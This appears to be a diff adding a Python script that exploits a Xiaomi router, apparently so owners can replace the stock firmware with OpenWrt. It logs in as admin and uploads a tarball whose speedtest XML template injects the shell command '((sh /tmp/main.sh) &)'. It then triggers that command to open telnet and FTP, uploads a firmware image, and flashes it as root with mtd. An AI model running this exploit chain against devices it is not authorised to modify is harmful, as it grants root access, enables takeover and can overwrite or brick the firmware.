@@ -1,0 +1,121 @@
+#!/usr/bin/python
+
+import os
+import re
+import time
+import random
+import hashlib
+import requests
+import tarfile
+import ftplib
+import telnetlib
+
+#command = "(/sbin/mtd -r write /tmp/openwrt.bin OS1 &)"
+#command = "((sh /tmp/install.sh) &)"
+command = "((sh /tmp/main.sh) &)"
+def get_ip_address():
+    ip_address = input('Ip Address: ')
+    return ip_address
+
+def get_mac():
+    try:
+        r0 = requests.get("http://{ip_address}/cgi-bin/luci/web".format(ip_address=ip_address), proxies={})
+    except:
+        print ('[-] No Xiaomi Router found. Check the router performance and try again.')
+    mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
+    return mac
+
+def create_nonce(mac):
+    type_ = 0
+    deviceId = mac
+    time_ = int(time.time())
+    rand = random.randint(0,10000)
+    return "%d_%s_%d_%d"%(type_, deviceId, time_, rand)
+
+def calc_password(nonce, account_str):
+    m = hashlib.sha1()
+    m.update((nonce + account_str).encode('utf-8'))
+    return m.hexdigest()
+
+def get_stok(ip_address, password):
+    mac = get_mac()
+    nonce = create_nonce(mac)
+    account_str = calc_password(password, 'a2ffa5c9be07488bbb04a3a47d3c5f6a')
+    password = calc_password(nonce, account_str)
+    data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
+    r2 = requests.post("http://{ip_address}/cgi-bin/luci/api/xqsystem/login".format(ip_address=ip_address),
+                       data = data,
+                       headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
+                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+                       proxies={})
+    return re.findall(r'"token":"(.*?)"',r2.text)[0]
+
+ip_address = input('IP Address (default: 192.168.31.1): ') or '192.168.31.1'
+password = input('Admin password (default: 12345678): ') or '12345678'
+openwrt_bin = input('Openwrt file path (default: openwrt.bin): ') or 'openwrt.bin'
+print('[+] Getting stock:', end=' ')
+stok = get_stok(ip_address, password)
+print(stok)
+proxies = {}
+
+#ip_address = get_ip_address()
+
+with open("files/speedtest_urls_template.xml","rt") as f:
+    template = f.read()
+data = template.format(ip_address=ip_address,command=command)
+
+with open("files/speedtest_urls.xml",'wt',newline='\n') as f:
+    f.write(data)
+
+with tarfile.open("files/payload.tar.gz", "w:gz") as tar:
+    tar.add("files/speedtest_urls.xml", "speedtest_urls.xml")
+    tar.add("files/main.sh", "main.sh")
+    tar.add("files/busybox", "busybox")
+
+os.remove("files/speedtest_urls.xml")
+
+print("[+] Uploading the exploit ", end=' ')
+r3 = requests.post("http://{ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload".format(ip_address=ip_address,stok=stok), files={"image":open("files/payload.tar.gz",'rb')}, proxies=proxies)
+r3res = r3.json()
+
+if r3res['code'] == 1629:
+    print('[SUCCESS]')
+else:
+    print('[ERROR]')
+    print('>> response: ', end='')
+    print(r3res)
+
+os.remove("files/payload.tar.gz")
+
+print("[+] Enabling telnet & FTP. response: ", end='')
+r4 = requests.get("http://{ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed".format(ip_address=ip_address,stok=stok), proxies=proxies)
+r4res = r4.json()
+if r4res['code'] == 0:
+    print('[SUCCESS]')
+    time.sleep(3)
+else:
+    print('[ERROR]')
+    print('>> response: ', end='')
+    print(r4res)
+
+try:
+    print('[+] Uploading openwrt.bin to router ', end='')
+    ftp=ftplib.FTP(ip_address)
+    with open(openwrt_bin, 'rb') as breed:
+        ftp.storbinary(f'STOR /tmp/openwrt.bin', breed)
+    ftp.quit()
+    print('[SUCCESS]')
+except Exception as e:
+    print('[ERROR]')
+    print('>> Error: ', end='')
+    print(e)
+    print('[-] Exiting')
+    exit()
+
+tn = telnetlib.Telnet(ip_address)
+print('[+] Logging in')
+tn.read_until(b"login:")
+tn.write(b"root\n")
+tn.read_until(b"root@XiaoQiang:~#")
+print('[+] Flashing Openwrt')
+tn.write(b"mtd -r write /tmp/openwrt.bin OS1 &\n")
